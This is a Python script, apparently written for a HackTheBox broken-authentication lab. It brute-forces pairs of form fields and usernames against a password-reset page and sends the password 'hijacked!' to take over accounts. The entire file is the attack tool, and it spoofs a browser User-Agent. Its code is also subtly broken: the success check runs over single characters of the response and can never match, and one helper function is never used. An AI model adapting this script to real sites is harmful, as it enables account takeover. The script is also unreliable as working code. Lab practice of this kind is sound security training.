import sys
import requests
import os.path

# target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/username_injection.php"

# fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
def unpack(fline):
    answer = fline

    return answer

# do the web request, change data as needed
def do_req(url, field, userid, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data
    data = {field: userid, "submit": "answer", "passwd": "hijacked!"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

# pretending we just know the message received when the answer is wrong, we flip the check
def check(haystack, needle):
    # if our invalid string is found in response body return False
    if needle in haystack:
        return False
    else:
        return True

def main():
    # check if wordlist has been given and exists
    if (len(sys.argv) > 2) and (os.path.isfile(sys.argv[1])) and (os.path.isfile(sys.argv[2])):
        f_fields = sys.argv[1]
        f_values = sys.argv[2]
    else:
        print("[!] Please check wordlists.")
        print("[-] Usage: python3 {} /path/to/input/field/wordlist /path/to/possible/username".format(sys.argv[0]))
        sys.exit()

    # open input field and load into a list, not very memory savvy but the list should not be so big
    fields = []
    with open(f_fields) as fh:
        for fline in fh:
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            field = unpack(fline.rstrip())
            fields.append(field)

    # open username wordlist and load into a list, not very memory savvy but the list should not be so big
    values = []
    with open(f_values) as fh:
        for fline in fh:
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            value = unpack(fline.rstrip())
            values.append(value)

    for _f in fields:
        for _v in values:
            # do HTTP request
            print("[-] Checking injection against field {} with value {}".format(_f, _v))
            res = do_req(url, _f, _v, headers)

            # print if response text matches our content "You are resetting password"
            for line in res:
                if "You are resetting password" in line:
                    print(line)

if __name__ == "__main__":
    main()
